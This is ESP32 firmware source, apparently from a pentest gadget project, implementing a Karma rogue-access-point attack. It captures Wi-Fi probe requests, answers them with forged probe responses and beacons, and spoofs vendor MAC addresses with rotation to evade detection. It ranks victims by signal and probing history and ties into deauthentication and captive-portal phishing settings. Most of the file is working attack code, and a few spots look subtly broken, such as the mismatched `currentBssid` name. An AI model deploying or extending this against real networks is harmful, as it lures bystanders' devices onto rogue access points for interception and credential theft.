/*
  Modernized Karma Attack - Enhanced for 2024+ devices
  Features: MAC randomization, beacon frames, encryption mimicry, low-latency responses
  Replaces original karma_setup() with enhanced version
*/

#include "FS.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/wifi/wifi_common.h"
#include "driver/gpio.h"
#include "esp_event.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "lwip/err.h"
#include "modules/wifi/evil_portal.h"
#include "nvs_flash.h"
#include <set>
#include <vector>
#include <map>
#include <algorithm>
#include <queue>
#include "freertos/ringbuf.h"
#include "freertos/queue.h"

#include "karma_attack.h"
#include "sniffer.h"
#include <Arduino.h>
#include <TimeLib.h>
#include <globals.h>

// Channel definitions if not provided elsewhere
#ifndef all_wifi_channels
const uint8_t all_wifi_channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14};
#endif

// Module display helpers
#ifndef display_clear
void display_clear() {
    tft.fillScreen(bruceConfig.bgColor);
}
#endif

//===== ENHANCED SETTINGS =====//
#define FILENAME "probe_capture_"
#define SAVE_INTERVAL 10
#define MAX_PROBE_BUFFER 1000
#define MAC_CACHE_SIZE 500
#define MAX_CLIENT_TRACK 150
#define FAST_HOP_INTERVAL 250
#define DEFAULT_HOP_INTERVAL 3000
#define DEAUTH_INTERVAL 30000
#define VULNERABLE_THRESHOLD 3
#define AUTO_PORTAL_DELAY 2000
#define SSID_FREQUENCY_RESET 30000
#define RESPONSE_TIMEOUT_MS 5
#define BEACON_INTERVAL_MS 102400
#define MAX_CONCURRENT_SSIDS 8
#define MAC_ROTATION_INTERVAL 30000

// Vendor OUIs for believable MACs
const uint8_t vendorOUIs[][3] = {
    {0x00, 0x50, 0xF2}, // Microsoft
    {0x00, 0x1A, 0x11}, // Google
    {0x00, 0x1B, 0x63}, // Apple
    {0x00, 0x24, 0x01}, // Cisco
    {0x00, 0x0C, 0x29}, // VMware
    {0x00, 0x1D, 0x0F}, // TP-Link
    {0x00, 0x26, 0x5E}, // Netgear
    {0x00, 0x19, 0xE3}, // D-Link
    {0x00, 0x21, 0x91}, // Intel
    {0x00, 0x1E, 0x8C}, // Broadcom
    {0x00, 0x12, 0x17}, // Aruba
    {0x00, 0x18, 0xDE}, // Samsung
    {0x00, 0x1E, 0xE1}, // Sony
    {0x00, 0x13, 0x10}, // Linksys
    {0x00, 0x1C, 0xDF}, // Ubiquiti
    {0x00, 0x0F, 0xEA}, // Asus
    {0x00, 0x14, 0x6C}, // Belkin
    {0x00, 0x25, 0x9C}, // Ruckus
    {0x00, 0x11, 0x22}, // Buffalo
    {0x00, 0x16, 0x6F}  // ZyXEL
};

const uint8_t priorityChannels[] = {1, 6, 11, 3, 8, 2, 7, 4, 9, 5, 10, 12, 13};
#define NUM_PRIORITY_CHANNELS 13

//===== SSIDDatabase Implementation =====//
std::vector<String> SSIDDatabase::ssids;
std::vector<String> SSIDDatabase::highPrioritySSIDs;

size_t SSIDDatabase::getCount() {
    return ssids.size();
}

std::vector<String> SSIDDatabase::getSSIDs() {
    return ssids;
}

std::vector<String> SSIDDatabase::getPopularSSIDs(size_t count) {
    std::vector<String> popular;
    
    size_t highPriorityCount = std::min(count / 2, highPrioritySSIDs.size());
    for (size_t i = 0; i < highPriorityCount; i++) {
        popular.push_back(highPrioritySSIDs[i]);
    }
    
    size_t regularCount = count - highPriorityCount;
    size_t regularStart = (ssids.size() > 100) ? ssids.size() - 100 : 0;
    for (size_t i = regularStart; i < ssids.size() && popular.size() < count; i++) {
        bool alreadyAdded = false;
        for (const auto &high : highPrioritySSIDs) {
            if (high == ssids[i]) {
                alreadyAdded = true;
                break;
            }
        }
        
        if (!alreadyAdded) {
            popular.push_back(ssids[i]);
        }
    }
    
    return popular;
}

bool SSIDDatabase::loadFromFile(FS &fs, const String &filename) {
    if (!fs.exists(filename)) {
        Serial.printf("[SSID] Database file %s not found\n", filename.c_str());
        return false;
    }
    
    File file = fs.open(filename, FILE_READ);
    if (!file) {
        Serial.printf("[SSID] Failed to open %s\n", filename.c_str());
        return false;
    }
    
    clear();
    
    while (file.available()) {
        String line = file.readStringUntil('\n');
        line.trim();
        if (line.length() > 0 && line.length() <= 32) {
            if (line.startsWith("*")) {
                line = line.substring(1);
                highPrioritySSIDs.push_back(line);
            }
            ssids.push_back(line);
        }
    }
    
    file.close();
    
    Serial.printf("[SSID] Loaded %d SSIDs (%d high priority)\n", 
                  ssids.size(), highPrioritySSIDs.size());
    return true;
}

void SSIDDatabase::clear() {
    ssids.clear();
    highPrioritySSIDs.clear();
}

void SSIDDatabase::addSSID(const String &ssid) {
    if (ssid.length() == 0 || ssid.length() > 32) return;
    
    for (const auto &existing : ssids) {
        if (existing == ssid) return;
    }
    
    ssids.push_back(ssid);
}

void SSIDDatabase::setHighPriority(const String &ssid, bool highPriority) {
    if (highPriority) {
        for (const auto &existing : highPrioritySSIDs) {
            if (existing == ssid) return;
        }
        highPrioritySSIDs.push_back(ssid);
    } else {
        highPrioritySSIDs.erase(
            std::remove(highPrioritySSIDs.begin(), highPrioritySSIDs.end(), ssid),
            highPrioritySSIDs.end()
        );
    }
}

bool SSIDDatabase::isDatabaseLoaded() {
    return !ssids.empty();
}

bool SSIDDatabase::autoLoad() {
    const char* dbPaths[] = {
        "/ssid_database.txt",
        "/ProbeData/ssid_database.txt",
        "/Database/ssid_list.txt",
        "/wordlists/ssid.txt",
        "/common_ssids.txt"
    };
    
    if (LittleFS.begin()) {
        for (const char* path : dbPaths) {
            if (LittleFS.exists(path)) {
                if (loadFromFile(LittleFS, path)) {
                    LittleFS.end();
                    return true;
                }
            }
        }
        LittleFS.end();
    }
    
    if (setupSdCard()) {
        for (const char* path : dbPaths) {
            if (SD.exists(path)) {
                if (loadFromFile(SD, path)) {
                    SD.end();
                    return true;
                }
            }
        }
        SD.end();
    }
    
    if (ssids.empty()) {
        Serial.println("[SSID] No database found, creating default...");
        createDefaultDatabase();
    }
    
    return !ssids.empty();
}

void SSIDDatabase::createDefaultDatabase() {
    const char* defaultSSIDs[] = {
        "Starbucks WiFi", "xfinitywifi", "attwifi", "SpectrumWiFi", 
        "Google Starbucks", "McDonald's Free WiFi", "T-Mobile", 
        "Verizon Wi-Fi", "AT&T Free Wi-Fi", "Airport_Free_WiFi",
        "Hotel_Guest_WiFi", "Marriott_Guest", "Hilton_Guest",
        "Linksys", "NETGEAR", "TP-Link", "D-Link", "ASUS", 
        "Belkin", "Cisco", "Ubiquiti", "Aruba",
        "Home Network", "MyWiFi", "Wireless", "WiFi", "Internet",
        "Home", "Family", "Guest", "Office", "Work",
        "AndroidAP", "iPhone", "Galaxy", "Pixel", "OnePlus",
        "Free Public WiFi", "Public WiFi", "Free WiFi",
        "CoffeeShop", "Restaurant", "Mall WiFi",
        "eduroam", "Boingo", "GogoInflight", "AA-Inflight",
        "DeltaWiFi", "United_WiFi", "SouthwestWiFi"
    };
    
    for (const char* ssid : defaultSSIDs) {
        addSSID(ssid);
    }
    
    setHighPriority("Starbucks WiFi", true);
    setHighPriority("xfinitywifi", true);
    setHighPriority("attwifi", true);
    setHighPriority("eduroam", true);
    setHighPriority("Free Public WiFi", true);
    
    Serial.printf("[SSID] Created default database with %d SSIDs\n", ssids.size());
    
    if (LittleFS.begin()) {
        File file = LittleFS.open("/ssid_database.txt", FILE_WRITE);
        if (file) {
            for (const auto& ssid : highPrioritySSIDs) {
                file.println("*" + ssid);
            }
            for (const auto& ssid : ssids) {
                bool isHighPriority = false;
                for (const auto& high : highPrioritySSIDs) {
                    if (high == ssid) {
                        isHighPriority = true;
                        break;
                    }
                }
                if (!isHighPriority) {
                    file.println(ssid);
                }
            }
            file.close();
            Serial.println("[SSID] Saved default database to LittleFS");
        }
        LittleFS.end();
    }
}

//===== BroadcastAttack Implementation =====//
BroadcastAttack::BroadcastAttack() : 
    active(false), broadcastInterval(300), startTime(0), 
    currentPos(0), totalBroadcasts(0), totalResponses(0) 
{
    responseCounts.clear();
}

bool BroadcastAttack::isActive() { 
    return active; 
}

void BroadcastAttack::start() { 
    if (!SSIDDatabase::isDatabaseLoaded()) {
        if (!SSIDDatabase::autoLoad()) {
            Serial.println("[BROADCAST] Failed to load SSID database!");
            return;
        }
    }
    
    size_t totalSSIDs = SSIDDatabase::getCount();
    if (totalSSIDs == 0) {
        Serial.println("[BROADCAST] SSID database is empty!");
        return;
    }
    
    active = true; 
    startTime = millis(); 
    currentPos = 0; 
    totalBroadcasts = 0;
    totalResponses = 0;
    responseCounts.clear();
    
    Serial.printf("[BROADCAST] Starting with %d SSIDs\n", totalSSIDs);
    
    std::vector<String> sampleSSIDs = SSIDDatabase::getPopularSSIDs(5);
    Serial.print("[BROADCAST] Sample SSIDs: ");
    for (size_t i = 0; i < sampleSSIDs.size(); i++) {
        if (i > 0) Serial.print(", ");
        Serial.print(sampleSSIDs[i]);
    }
    Serial.println();
}

void BroadcastAttack::stop() { 
    active = false; 
    Serial.println("[BROADCAST] Stopped");
}

void BroadcastAttack::update() { 
    if (!active) return;
    
    unsigned long now = millis();
    static unsigned long lastBroadcast = 0;
    
    if (now - lastBroadcast >= broadcastInterval) {
        size_t ssidCount = SSIDDatabase::getCount();
        if (ssidCount == 0) {
            Serial.println("[BROADCAST] No SSIDs in database!");
            stop();
            return;
        }
        
        std::vector<String> ssids = SSIDDatabase::getSSIDs();
        if (currentPos >= ssids.size()) {
            currentPos = 0;
        }
        
        String currentSSID = ssids[currentPos];
        
        uint8_t probeResponse[128] = {0};
        uint8_t pos = 0;

        probeResponse[pos++] = 0x50;
        probeResponse[pos++] = 0x00;

        probeResponse[pos++] = 0x00;
        probeResponse[pos++] = 0x00;

        memset(&probeResponse[pos], 0xFF, 6);
        pos += 6;

        uint8_t fakeMAC[] = {0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC};
        memcpy(&probeResponse[pos], fakeMAC, 6);
        pos += 6;

        memcpy(&probeResponse[pos], fakeMAC, 6);
        pos += 6;

        probeResponse[pos++] = 0x00;
        probeResponse[pos++] = 0x00;

        for (int i = 0; i < 8; i++) probeResponse[pos++] = 0x00;

        probeResponse[pos++] = 0x64;
        probeResponse[pos++] = 0x00;

        probeResponse[pos++] = 0x01;
        probeResponse[pos++] = 0x04;

        probeResponse[pos++] = 0x00;
        probeResponse[pos++] = currentSSID.length();
        memcpy(&probeResponse[pos], currentSSID.c_str(), currentSSID.length());
        pos += currentSSID.length();

        uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
        probeResponse[pos++] = 0x01;
        probeResponse[pos++] = sizeof(rates);
        memcpy(&probeResponse[pos], rates, sizeof(rates));
        pos += sizeof(rates);

        probeResponse[pos++] = 0x03;
        probeResponse[pos++] = 0x01;
        probeResponse[pos++] = all_wifi_channels[channl];

        esp_wifi_set_channel(all_wifi_channels[channl], WIFI_SECOND_CHAN_NONE);
        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, probeResponse, pos, false);
        
        if (err == ESP_OK) {
            totalBroadcasts++;
            currentPos++;
            
            if (totalBroadcasts % 50 == 0) {
                Serial.printf("[BROADCAST] Sent %d broadcasts, %d responses received\n",
                            totalBroadcasts, totalResponses);
            }
        }
        
        lastBroadcast = now;
    }
}

void BroadcastAttack::processProbeResponse(const String& ssid, const String& mac) {
    if (!active) return;
    
    totalResponses++;
    responseCounts[ssid]++;
    
    if (responseCounts[ssid] % 10 == 0) {
        Serial.printf("[BROADCAST] SSID '%s' has %d responses\n", 
                     ssid.c_str(), responseCounts[ssid]);
    }
}

float BroadcastAttack::getProgressPercent() { 
    size_t totalSSIDs = SSIDDatabase::getCount();
    return (totalSSIDs > 0) ? (currentPos * 100.0 / totalSSIDs) : 0; 
}

void BroadcastAttack::setBroadcastInterval(uint16_t interval) { 
    broadcastInterval = interval; 
    Serial.printf("[BROADCAST] Interval set to %dms\n", interval);
}

size_t BroadcastAttack::getCurrentPosition() { 
    return currentPos; 
}

void BroadcastAttack::restart() { 
    currentPos = 0; 
    startTime = millis();
    totalBroadcasts = 0;
    totalResponses = 0;
    responseCounts.clear();
    Serial.println("[BROADCAST] Restarted");
}

void BroadcastAttack::clearHighPrioritySSIDs() {
    std::vector<String> ssids = SSIDDatabase::getSSIDs();
    for (const auto& ssid : ssids) {
        SSIDDatabase::setHighPriority(ssid, false);
    }
    Serial.println("[BROADCAST] Cleared high priority SSIDs");
}

BroadcastStats BroadcastAttack::getStats() { 
    return {startTime, totalBroadcasts, totalResponses};
}

std::vector<std::pair<String, size_t>> BroadcastAttack::getTopResponses(size_t count) {
    std::vector<std::pair<String, size_t>> topResponses;
    
    for (const auto& pair : responseCounts) {
        topResponses.push_back(pair);
    }
    
    std::sort(topResponses.begin(), topResponses.end(),
        [](const auto& a, const auto& b) { return a.second > b.second; });
    
    if (count < topResponses.size()) {
        topResponses.resize(count);
    }
    
    return topResponses;
}

//===== Global Instances =====//
BroadcastAttack broadcastAttack;

//===== ENHANCED Run-Time variables =====//
unsigned long last_time = 0;
unsigned long last_ChannelChange = 0;
unsigned long lastFrequencyReset = 0;
unsigned long lastBeaconTime = 0;
unsigned long lastMACRotation = 0;
uint8_t channl = 0;
bool flOpen = false;
bool is_LittleFS = true;
uint32_t pkt_counter = 0;
bool auto_hopping = true;
uint16_t hop_interval = DEFAULT_HOP_INTERVAL;

File _probe_file;
RingbufHandle_t macRingBuffer;
String filen = "";

ProbeRequest probeBuffer[MAX_PROBE_BUFFER];
uint16_t probeBufferIndex = 0;
bool bufferWrapped = false;

std::map<String, ClientBehavior> clientBehaviors;
KarmaConfig karmaConfig;
AttackConfig attackConfig;

uint8_t channelActivity[14] = {0};
uint8_t currentPriorityChannel = 0;
unsigned long lastDeauthTime = 0;
unsigned long lastSaveTime = 0;

uint32_t totalProbes = 0;
uint32_t uniqueClients = 0;
uint32_t karmaResponsesSent = 0;
uint32_t deauthPacketsSent = 0;
uint32_t autoPortalsLaunched = 0;
uint32_t cloneAttacksLaunched = 0;
uint32_t beaconsSent = 0;
bool redrawNeeded = true;
bool isPortalActive = false;
bool restartKarmaAfterPortal = false;

// Enhanced tracking
std::map<String, NetworkHistory> networkHistory;
std::queue<ProbeResponseTask> responseQueue;
std::vector<ActiveNetwork> activeNetworks;
std::map<String, uint32_t> macBlacklist;
uint8_t currentBSSID[6];

// Portal templates
std::vector<PortalTemplate> portalTemplates;
PortalTemplate selectedTemplate;
bool templateSelected = false;

// SSID frequency tracking
std::map<String, uint16_t> ssidFrequency;
std::vector<std::pair<String, uint16_t>> popularSSIDs;

// Auto-portal launching
std::vector<PendingPortal> pendingPortals;
std::vector<PendingPortal> activePortals;

//===== FUNCTIONS =====//

String generateUniqueFilename(FS &fs, bool compressed) {
    String basePath = "/ProbeData/";
    String baseName = compressed ? "karma_compressed_" : "probe_capture_";
    String extension = compressed ? ".bin" : ".txt";

    if (!fs.exists(basePath)) { fs.mkdir(basePath); }

    int counter = 1;
    String filename;
    do {
        filename = basePath + baseName + String(counter) + extension;
        counter++;
    } while (fs.exists(filename));

    return filename;
}

void initMACCache() {
    macRingBuffer = xRingbufferCreate(MAC_CACHE_SIZE * 18, RINGBUF_TYPE_NOSPLIT);
    if (!macRingBuffer) {
        Serial.println("[ERROR] Failed to create MAC ring buffer!");
    }
}

bool isMACInCache(const String &mac) {
    if (!macRingBuffer) return false;

    size_t itemSize;
    char *item = (char *)xRingbufferReceive(macRingBuffer, &itemSize, 0);

    while (item) {
        if (String(item) == mac) {
            vRingbufferReturnItem(macRingBuffer, item);
            return true;
        }
        vRingbufferReturnItem(macRingBuffer, item);
        item = (char *)xRingbufferReceive(macRingBuffer, &itemSize, 0);
    }
    return false;
}

void addMACToCache(const String &mac) {
    if (!macRingBuffer) return;

    if (xRingbufferGetCurFreeSize(macRingBuffer) < mac.length() + 1) {
        size_t itemSize;
        char *oldItem = (char *)xRingbufferReceive(macRingBuffer, &itemSize, 0);
        if (oldItem) {
            vRingbufferReturnItem(macRingBuffer, oldItem);
        }
    }

    xRingbufferSend(macRingBuffer, mac.c_str(), mac.length() + 1, pdMS_TO_TICKS(100));
}

bool isProbeRequestWithSSID(const wifi_promiscuous_pkt_t *packet) {
    if (!packet || packet->rx_ctrl.sig_len < 36) {
        return false;
    }

    const uint8_t *frame = packet->payload;
    uint8_t frameType = (frame[0] & 0x0C) >> 2;
    uint8_t frameSubType = (frame[0] & 0xF0) >> 4;

    if (frameType != 0x00 || frameSubType != 0x04) {
        return false;
    }

    uint8_t pos = 24;
    while (pos + 1 < packet->rx_ctrl.sig_len) {
        uint8_t tag = frame[pos];
        uint8_t len = frame[pos + 1];

        if (pos + 2 + len > packet->rx_ctrl.sig_len) {
            return false;
        }

        if (tag == 0x00 && len > 0 && len <= 32) {
            return true;
        }

        pos += 2 + len;
    }

    return false;
}

String extractSSID(const wifi_promiscuous_pkt_t *packet) {
    const uint8_t *frame = packet->payload;
    int pos = 24;

    while (pos + 1 < packet->rx_ctrl.sig_len) {
        uint8_t tag = frame[pos];
        uint8_t len = frame[pos + 1];

        if (tag == 0x00 && len > 0 && len <= 32 && (pos + 2 + len <= packet->rx_ctrl.sig_len)) {
            bool hidden = true;
            bool printable = true;

            for (int i = 0; i < len; i++) {
                uint8_t c = frame[pos + 2 + i];
                if (c != 0x00) hidden = false;
                if (c < 32 || c > 126) printable = false;
            }

            if (hidden || !printable) {
                return "";
            }

            char ssid[len + 1];
            memcpy(ssid, &frame[pos + 2], len);
            ssid[len] = '\0';
            return String(ssid);
        }

        pos += 2 + len;
    }

    return "";
}

String extractMAC(const wifi_promiscuous_pkt_t *packet) {
    const uint8_t *frame = packet->payload;
    char mac[18];
    snprintf(
        mac,
        sizeof(mac),
        "%02X:%02X:%02X:%02X:%02X:%02X",
        frame[10], frame[11], frame[12],
        frame[13], frame[14], frame[15]
    );
    return String(mac);
}

// Extract RSN (WPA2/WPA3) information from probe
RSNInfo extractRSNInfo(const uint8_t *frame, int len) {
    RSNInfo rsn = {0, 0, 0, 0};
    int pos = 24;
    
    while (pos + 1 < len) {
        uint8_t tag = frame[pos];
        uint8_t tagLen = frame[pos + 1];
        
        if (tag == 0x30 && tagLen >= 2) { // RSN tag
            if (pos + 2 + tagLen <= len) {
                rsn.version = (frame[pos + 2] << 8) | frame[pos + 3];
                
                uint8_t groupCipher = frame[pos + 4];
                if (groupCipher == 0x00) rsn.groupCipher = 1;
                else if (groupCipher == 0x02) rsn.groupCipher = 2;
                
                if (tagLen > 6) {
                    uint8_t pairwiseCipher = frame[pos + 8];
                    if (pairwiseCipher == 0x00) rsn.pairwiseCipher = 1;
                    else if (pairwiseCipher == 0x02) rsn.pairwiseCipher = 2;
                }
                
                if (tagLen > 12) {
                    uint8_t akmSuite = frame[pos + 12];
                    if (akmSuite == 0x00 || akmSuite == 0x02) rsn.akmSuite = 1;
                    else if (akmSuite == 0x08) rsn.akmSuite = 2;
                }
            }
        }
        pos += 2 + tagLen;
    }
    return rsn;
}

void analyzeClientBehavior(const ProbeRequest &probe) {
    auto it = clientBehaviors.find(probe.mac);

    if (it == clientBehaviors.end()) {
        if (clientBehaviors.size() >= MAX_CLIENT_TRACK) {
            String oldestMAC;
            uint32_t oldestTime = UINT32_MAX;

            for (const auto &clientPair : clientBehaviors) {
                if (clientPair.second.lastSeen < oldestTime) {
                    oldestTime = clientPair.second.lastSeen;
                    oldestMAC = clientPair.first;
                }
            }

            if (!oldestMAC.isEmpty()) {
                clientBehaviors.erase(oldestMAC);
            }
        }

        ClientBehavior behavior;
        behavior.mac = probe.mac;
        behavior.firstSeen = probe.timestamp;
        behavior.lastSeen = probe.timestamp;
        behavior.probeCount = 1;
        behavior.avgRSSI = probe.rssi;
        behavior.probedSSIDs.push_back(probe.ssid);
        behavior.favoriteChannel = probe.channel;
        behavior.lastKarmaAttempt = 0;
        behavior.isVulnerable = (probe.ssid.length() > 0);

        clientBehaviors[probe.mac] = behavior;
        uniqueClients++;

    } else {
        ClientBehavior &behavior = it->second;
        behavior.lastSeen = probe.timestamp;
        behavior.probeCount++;
        behavior.avgRSSI = (behavior.avgRSSI + probe.rssi) / 2;

        if (probe.channel >= 1 && probe.channel <= 14) {
            channelActivity[probe.channel - 1]++;
            if (channelActivity[probe.channel - 1] > channelActivity[behavior.favoriteChannel - 1]) {
                behavior.favoriteChannel = probe.channel;
            }
        }

        bool ssidExists = false;
        for (const auto &existingSSID : behavior.probedSSIDs) {
            if (existingSSID == probe.ssid) {
                ssidExists = true;
                break;
            }
        }

        if (!ssidExists && probe.ssid.length() > 0) {
            behavior.probedSSIDs.push_back(probe.ssid);

            if (behavior.probedSSIDs.size() >= VULNERABLE_THRESHOLD) {
                behavior.isVulnerable = true;
            }
        }
    }
}

uint8_t calculateAttackPriority(const ClientBehavior &client, const ProbeRequest &probe) {
    uint8_t score = 0;

    if (probe.rssi > -50) score += 30;
    else if (probe.rssi > -65) score += 20;
    else if (probe.rssi > -75) score += 10;

    if (client.probeCount > 10) score += 25;
    else if (client.probeCount > 5) score += 15;
    else if (client.probeCount > 2) score += 5;

    if (client.isVulnerable) score += 20;

    unsigned long sinceLast = millis() - client.lastSeen;
    if (sinceLast < 5000) score += 15;
    else if (sinceLast < 15000) score += 10;
    else if (sinceLast < 30000) score += 5;

    String ssidLower = probe.ssid;
    ssidLower.toLowerCase();
    if (ssidLower.indexOf("starbucks") != -1 ||
        ssidLower.indexOf("xfinity") != -1 ||
        ssidLower.indexOf("att") != -1 ||
        ssidLower.indexOf("spectrum") != -1 ||
        ssidLower.indexOf("comcast") != -1 ||
        ssidLower.indexOf("tmobile") != -1) {
        score += 10;
    }

    return min(score, (uint8_t)100);
}

AttackTier determineAttackTier(uint8_t priority) {
    if (priority >= 80) return TIER_HIGH;
    if (priority >= 60) return TIER_MEDIUM;
    if (priority >= 40) return TIER_FAST;
    return TIER_NONE;
}

uint16_t getPortalDuration(AttackTier tier) {
    switch(tier) {
        case TIER_CLONE: return (uint16_t)attackConfig.cloneDuration;
        case TIER_HIGH: return attackConfig.highTierDuration;
        case TIER_MEDIUM: return attackConfig.mediumTierDuration;
        case TIER_FAST: return attackConfig.fastTierDuration;
        default: return attackConfig.mediumTierDuration;
    }
}

// Generate believable random MAC
void generateRandomBSSID(uint8_t *bssid) {
    uint8_t vendorIndex = esp_random() % (sizeof(vendorOUIs) / 3);
    memcpy(bssid, vendorOUIs[vendorIndex], 3);
    
    bssid[3] = esp_random() & 0xFF;
    bssid[4] = esp_random() & 0xFF;
    bssid[5] = esp_random() & 0xFF;
    
    bssid[0] &= 0xFE;
}

// Rotate BSSID periodically
void rotateBSSID() {
    if (millis() - lastMACRotation > MAC_ROTATION_INTERVAL) {
        generateRandomBSSID(currentBSSID);
        lastMACRotation = millis();
        Serial.printf("[MAC] Rotated BSSID to %02X:%02X:%02X:%02X:%02X:%02X\n",
                     currentBSSID[0], currentBSSID[1], currentBSSID[2],
                     currentBSSID[3], currentBSSID[4], currentBSSID[5]);
    }
}

// Build enhanced probe response with proper encryption
size_t buildEnhancedProbeResponse(uint8_t *buffer, const String &ssid, 
                                 const String &targetMAC, uint8_t channel, 
                                 const RSNInfo &rsn, bool isHidden = false) {
    uint8_t pos = 0;
    
    buffer[pos++] = 0x50;
    buffer[pos++] = 0x00;
    
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    
    sscanf(targetMAC.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &buffer[pos], &buffer[pos+1], &buffer[pos+2],
           &buffer[pos+3], &buffer[pos+4], &buffer[pos+5]);
    pos += 6;
    
    memcpy(&buffer[pos], currentBSSID, 6);
    pos += 6;
    
    memcpy(&buffer[pos], currentBSSID, 6);
    pos += 6;
    
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    
    for (int i = 0; i < 8; i++) buffer[pos++] = 0x00;
    
    buffer[pos++] = 0x64;
    buffer[pos++] = 0x00;
    
    if (rsn.akmSuite > 0 || rsn.pairwiseCipher > 0) {
        buffer[pos++] = 0x31;
        buffer[pos++] = 0x04;
    } else {
        buffer[pos++] = 0x21;
        buffer[pos++] = 0x04;
    }
    
    buffer[pos++] = 0x00;
    buffer[pos++] = isHidden ? 0x00 : (uint8_t)ssid.length();
    if (!isHidden && ssid.length() > 0) {
        memcpy(&buffer[pos], ssid.c_str(), ssid.length());
        pos += ssid.length();
    }
    
    uint8_t rates[] = {0x82, 0x84, 0x8b, 0x0c, 0x12, 0x96, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c};
    buffer[pos++] = 0x01;
    buffer[pos++] = sizeof(rates);
    memcpy(&buffer[pos], rates, sizeof(rates));
    pos += sizeof(rates);
    
    buffer[pos++] = 0x03;
    buffer[pos++] = 0x01;
    buffer[pos++] = channel;
    
    buffer[pos++] = 0x05;
    buffer[pos++] = 0x04;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x01;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    
    buffer[pos++] = 0x2a;
    buffer[pos++] = 0x01;
    buffer[pos++] = 0x00;
    
    uint8_t extRates[] = {0x32, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60};
    buffer[pos++] = 0x32;
    buffer[pos++] = sizeof(extRates);
    memcpy(&buffer[pos], extRates, sizeof(extRates));
    pos += sizeof(extRates);
    
    if (rsn.akmSuite > 0) {
        buffer[pos++] = 0x30;
        
        if (rsn.akmSuite == 2) {
            uint8_t rsnData[] = {
                0x01, 0x00,
                0x00, 0x0F, 0xAC, 0x04,
                0x01, 0x00,
                0x00, 0x0F, 0xAC, 0x04,
                0x01, 0x00,
                0x00, 0x0F, 0xAC, 0x08,
                0xAC, 0x01,
                0x00, 0x00
            };
            buffer[pos++] = sizeof(rsnData);
            memcpy(&buffer[pos], rsnData, sizeof(rsnData));
            pos += sizeof(rsnData);
        } else {
            uint8_t rsnData[] = {
                0x01, 0x00,
                0x00, 0x0F, 0xAC, 0x04,
                0x01, 0x00,
                0x00, 0x0F, 0xAC, 0x04,
                0x01, 0x00,
                0x00, 0x0F, 0xAC, 0x02,
                0x00, 0x00,
                0x00, 0x00
            };
            buffer[pos++] = sizeof(rsnData);
            memcpy(&buffer[pos], rsnData, sizeof(rsnData));
            pos += sizeof(rsnData);
        }
    }
    
    buffer[pos++] = 0x2d;
    buffer[pos++] = 0x1a;
    uint8_t htCap[] = {
        0xef, 0x09,
        0x1b,
        0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00,
        0x00, 0x00,
        0x00
    };
    memcpy(&buffer[pos], htCap, sizeof(htCap));
    pos += sizeof(htCap);
    
    buffer[pos++] = 0x7f;
    buffer[pos++] = 0x04;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x40;
    
    return pos;
}

// Build beacon frame
size_t buildBeaconFrame(uint8_t *buffer, const String &ssid, 
                        uint8_t channel, const RSNInfo &rsn) {
    uint8_t pos = 0;
    
    buffer[pos++] = 0x80;
    buffer[pos++] = 0x00;
    
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    
    memset(&buffer[pos], 0xFF, 6);
    pos += 6;
    
    memcpy(&buffer[pos], currentBssid, 6);
    pos += 6;
    
    memcpy(&buffer[pos], currentBssid, 6);
    pos += 6;
    
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    
    static uint64_t timestamp = 0;
    timestamp += 1024;
    for (int i = 0; i < 8; i++) {
        buffer[pos++] = (timestamp >> (8 * i)) & 0xFF;
    }
    
    buffer[pos++] = 0x64;
    buffer[pos++] = 0x00;
    
    if (rsn.akmSuite > 0) {
        buffer[pos++] = 0x31;
        buffer[pos++] = 0x04;
    } else {
        buffer[pos++] = 0x21;
        buffer[pos++] = 0x04;
    }
    
    buffer[pos++] = 0x00;
    buffer[pos++] = (uint8_t)ssid.length();
    if (ssid.length() > 0) {
        memcpy(&buffer[pos], ssid.c_str(), ssid.length());
        pos += ssid.length();
    }
    
    uint8_t rates[] = {0x82, 0x84, 0x8b, 0x0c, 0x12, 0x96, 0x18, 0x24};
    buffer[pos++] = 0x01;
    buffer[pos++] = sizeof(rates);
    memcpy(&buffer[pos], rates, sizeof(rates));
    pos += sizeof(rates);
    
    buffer[pos++] = 0x03;
    buffer[pos++] = 0x01;
    buffer[pos++] = channel;
    
    if (rsn.akmSuite > 0) {
        buffer[pos++] = 0x30;
        
        if (rsn.akmSuite == 2) {
            uint8_t rsnData[] = {
                0x01, 0x00,
                0x00, 0x0F, 0xAC, 0x04,
                0x01, 0x00,
                0x00, 0x0F, 0xAC, 0x04,
                0x01, 0x00,
                0x00, 0x0F, 0xAC, 0x08,
                0xAC, 0x01,
                0x00, 0x00
            };
            buffer[pos++] = sizeof(rsnData);
            memcpy(&buffer[pos], rsnData, sizeof(rsnData));
            pos += sizeof(rsnData);
        } else {
            uint8_t rsnData[] = {
                0x01, 0x00,
                0x00, 0x0F, 0xAC, 0x04,
                0x01, 0x00,
                0x00, 0x0F, 0xAC, 0x04,
                0x01, 0x00,
                0x00, 0x0F, 0xAC, 0x02,
                0x00, 0x00,
                0x00, 0x00
            };
            buffer[pos++] = sizeof(rsnData);
            memcpy(&buffer[pos], rsnData, sizeof(rsnData));
            pos += sizeof(rsnData);
        }
    }
    
    buffer[pos++] = 0x05;
    buffer[pos++] = 0x04;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x01;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    
    return pos;
}

